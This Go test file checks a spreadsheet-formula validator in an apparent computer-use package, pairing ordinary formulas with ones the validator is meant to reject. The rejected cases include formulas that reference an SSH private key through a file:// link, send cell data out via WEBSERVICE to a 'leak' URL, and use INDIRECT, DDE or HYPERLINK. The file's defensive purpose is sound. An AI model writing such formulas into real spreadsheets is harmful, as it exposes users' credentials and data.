package computeruse

import (
	"strings"
	"testing"
)

func TestFormulaProblem(t *testing.T) {
	for _, ok := range []string{
		"", "text", "385", "=SUM(B2:B9)", "=sum(B2:B9)", "=SUM($B$2:$B$9)", "=ROUND(AVERAGE(B2:B9), 1)",
		"=IF(B2>0;B2;0)", "=Sheet2.A1+1", "=A1*2", `=CONCATENATE("a#b";"it's")`, `="say ""#"" ok"`,
		"=VLOOKUP(A2, A1:C9, 2, 0)", "=STDEV_NOT_A_CALL+1",
	} {
		if p := FormulaProblem(ok); p != "" {
			t.Errorf("%q refused: %s", ok, p)
		}
	}
	for _, bad := range []struct{ f, why string }{
		{"='file:///home/u/.ssh/id_ed25519'#$Sheet1.A1", "no '"},
		{"=A1&'x'", "no '"},
		{"=file:///x#$Sheet1.A1", "no #"},
		{`=WEBSERVICE("http://127.0.0.1/leak?"&A1)`, "not WEBSERVICE"},
		{`=webservice ("http://x")`, "not WEBSERVICE"},
		{`=INDIRECT("'file:///x'#$a.A1")`, "not INDIRECT"},
		{`=DDE("soffice";"/x";"A1")`, "not DDE"},
		{`=HYPERLINK("http://x")`, "not HYPERLINK"},
		{`=SUM(1)+FILTERXML(A1;"//x")`, "not FILTERXML"},
		{`="unclosed`, "unclosed"},
		{"=" + strings.Repeat("A1+", 400) + "1", "longer than"},
	} {
		if p := FormulaProblem(bad.f); !strings.Contains(p, bad.why) {
			t.Errorf("%q: %q, want %q", bad.f, p, bad.why)
		}
	}
}

func TestEditsFormulaProblem(t *testing.T) {
	ok := []any{map[string]any{"op": "set", "cell": "B4", "value": "=SUM(B2:B3)"}, map[string]any{"op": "append_row", "values": []any{"Total", 3.5, "=B1"}}}
	if p := EditsFormulaProblem(ok); p != "" {
		t.Fatal(p)
	}
	for _, bad := range [][]any{
		{map[string]any{"op": "set", "cell": "A1", "value": `=WEBSERVICE("http://x")`}},
		{map[string]any{"op": "append_row", "values": []any{"x", "='file:///x'#$a.A1"}}},
	} {
		if EditsFormulaProblem(bad) == "" {
			t.Errorf("%v passed", bad)
		}
	}
}
